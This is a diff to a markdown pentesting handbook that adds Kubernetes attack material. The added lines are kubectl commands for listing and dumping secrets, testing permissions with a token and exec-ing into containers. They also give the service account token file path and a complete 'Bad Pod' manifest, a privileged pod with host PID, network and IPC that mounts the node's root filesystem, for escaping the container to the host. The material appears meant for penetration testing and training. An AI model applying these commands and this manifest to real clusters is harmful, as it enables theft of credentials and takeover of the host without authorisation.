@@ -6,6 +6,8 @@
 
 - [Docker](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/container.md#Docker)
 - [Docker-Compose](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/container.md#Docker-Compose)
+- [kubectl](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/container.md#kubectl)
+- [kubeletctl](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/container.md#kubeletctl)
 - [Kubernetes](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/container.md#Kubernetes)
 - [LXD](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/container.md#LXD)
 
@@ -267,6 +269,8 @@ networks:
 
 > https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/
 
+> https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux
+
 ```c
 $ sudo apt-get update && sudo apt-get install -y apt-transport-https
 $ curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo gpg --dearmour -o /usr/share/keyrings/kubernetes.gpg
@@ -274,47 +278,70 @@ $ echo "deb [arch=amd64 signed-by=/usr/share/keyrings/kubernetes.gpg] https://ap
 $ sudo apt-get update
 $ sudo apt-get install -y kubectl
 ```
+### Common Commands
 
-### Checking Capabilities
+```c
+$ ./kubectl get pods                                // list all available pods
+$ ./kubectl get services                            // list all services
+$ ./kubectl get serviceaccount                      // list all serviceaccounts
+$ ./kubectl auth can-i --list                       // check permissions
+$ ./kubectl get secrets                             // list secrets
+$ ./kubectl describe secret <SECRET>                // display secret
+$ ./kubectl get secret <SECRET> -o 'json'           // show in detail
+$ ./kubectl describe pod <CONTAINER>                // get container information
+$ ./kubectl delete pod <CONTAINER>                  // delete a specific container
+$ ./kubectl auth can-i --list --token=<TOKEN>       // check permissions with authentication
+$ ./kubectl apply -f privesc.yml --token=<TOKEN>    // apply pod configuration file
+$ ./kubectl exec -it <CONTAINER> --token=<TOKEN> -- /bin/bash                    // gain access to a container
+$ ./kubectl exec -it everything-allowed-exec-pod --token=<TOKEN> -- /bin/bash    // execute privileged container
+```
+
+### Secret Location
+
+```c
+/var/run/secrets/kubernetes.io/serviceaccount/token
+```
+
+### Bad Pod Container Escape
+
+> https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
+
+> https://jsonformatter.org/yaml-formatter
 
 ```c
 $ export token="<TOKEN>"
-$ kubectl --token=$token --certificate-authority=<CERTIFICATE> --server=https://<RHOST>:8443 auth can-i --list
 ```
 
-### Bad Pod Example YAML
-
 ```c
+cat << 'EOF' |
 apiVersion: v1
 kind: Pod
 metadata:
-  name: badpod
-  namespace: default
+  name: everything-allowed-exec-pod
+  labels:
+    app: pentest
 spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
   containers:
-  - name: badpod
-    image: nginx:1.14.2
+  - name: everything-allowed-pod
+    image: ubuntu
+    imagePullPolicy: IfNotPresent
+    securityContext:
+      privileged: true
     volumeMounts:
-    - mountPath: /root
-      name: mount-root-into-mnt
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
   volumes:
-  - name: mount-root-into-mnt
+  - name: noderoot
     hostPath:
       path: /
-  automountServiceAccountToken: true
-  hostNetwork: true
-```
-
-### Deployment
-
-```c
-$ kubectl --token=$token --certificate-authority=<CERTIFICATE>.crt --server=https://<RHOST>:8443 apply -f badpod.yaml
-```
-
-### Checking Pod Status
-
-```c
-$ kubectl --token=$token --certificate-authority=<CERTIFICATE>.crt --server=https://<RHOST>:8443 get pods
+EOF
+(export NAMESPACE=default && ./kubectl apply -n $NAMESPACE -f - --token=$TOKEN)
 ```
 
 ## kubeletctl
